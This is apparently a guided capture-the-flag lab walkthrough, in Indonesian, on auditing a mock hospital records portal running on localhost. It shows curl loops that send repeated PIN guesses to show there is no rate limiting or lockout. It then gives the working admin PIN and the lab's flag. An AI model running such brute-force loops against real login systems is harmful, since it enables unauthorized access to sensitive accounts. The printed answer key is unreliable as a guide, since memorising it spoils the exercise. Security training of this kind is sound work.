# Panduan Praktik Terbimbing: Audit Autentikasi pada NexHealth Portal

Dalam panduan terarah ini, kamu akan mempraktikkan proses audit ketahanan autentikasi terhadap portal rekam medis rumah sakit **NexHealth Portal (Hospital Electronic Medical Records & Patient Portal)** yang beroperasi pada `http://127.0.0.1:8017`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8017/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A07","port":8017,"status":"ok"}
   ```
2. Buka peramban web dan akses halaman login:
   `http://127.0.0.1:8017/login`
3. Perhatikan formulir **Staff EMR Gateway**:
   - Akun default adalah `admin` (Chief Medical Officer).
   - Bidang masukan kata sandi dirancang untuk PIN 4-digit numerik.
   - Amati ketiadaan perlindungan CAPTCHA atau petunjuk kebijakan penguncian akun.

---

### Langkah 2: Pengujian Kerentanan Ketiadaan Rate-Limiting
1. Uji coba input PIN salah beberapa kali secara manual di browser (misalnya `0000`, `1111`, `1234`).
2. Kirimkan rentetan percobaan salah berturut-turut melalui loop cURL di terminal:
   ```bash
   for pin in 0001 0002 0003 0004 0005; do
     curl -s -X POST http://127.0.0.1:8017/api/login \
       -H "Content-Type: application/json" \
       -d "{\"username\": \"admin\", \"password\": \"$pin\"}"
     echo ""
   done
   ```
3. **Analisis Temuan Kritis:**
   - Server selalu mengembalikan status penolakan biasa tanpa pernah memperlambat waktu respon (*no throttling*).
   - Akun tidak terkunci (*no lockout*), dan tidak ada verifikasi bot sama sekali. Sistem membuka pintu bagi serangan brute-force otomatis tanpa batas!

> [!NOTE]
> **💡 Di Balik Layar: Mengapa brute force ini bisa berhasil?**  
> PIN 4-digit hanya memiliki $10.000$ kemungkinan (0000-9999). Tanpa rate-limiting, sebuah skrip sederhana dapat menguji seluruh $10.000$ kombinasi dalam waktu kurang dari 3 menit pada koneksi lokal!

---

### Langkah 3: Eksekusi Targeted Brute-Force & Autentikasi Berhasil
1. Dalam audit pentest profesional, penguji memprioritaskan kata sandi atau PIN berdasar konteks (seperti tahun berjalan korporasi: `2026`).
2. Masukkan PIN `2026` untuk akun `admin` melalui peramban atau kirimkan via terminal cURL:
   ```bash
   curl -s -X POST http://127.0.0.1:8017/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "2026"}'
   ```
3. **Respons Keberhasilan Otentikasi:**
   ```json
   {
     "status": "authenticated",
     "user": "admin",
     "role": "Chief Medical Officer",
     "redirect": "/admin",
     "flag": "ZITERA{4uth_f41lur3_brut3_f0rc3_2026}"
   }
   ```

---

### Langkah 4: Akses Konsol Rekam Medis & Eksfiltrasi Flag
1. Kembali ke peramban web pada `http://127.0.0.1:8017/login`.
2. Masukkan kredensial:
   - **Staff Identifier:** `admin`
   - **Security PIN:** `2026`
3. Klik tombol **"Access Clinical Systems"**.
4. Anda dialihkan ke konsol klinis `/admin`.
5. Di bagian **Chief Medical Officer Executive Telemetry Seal**, perhatikan token validasi kepatuhan berformat bendera resmi:
   `ZITERA{4uth_f41lur3_brut3_f0rc3_2026}`
6. Salin flag tersebut dan kirimkan (*submit*) ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
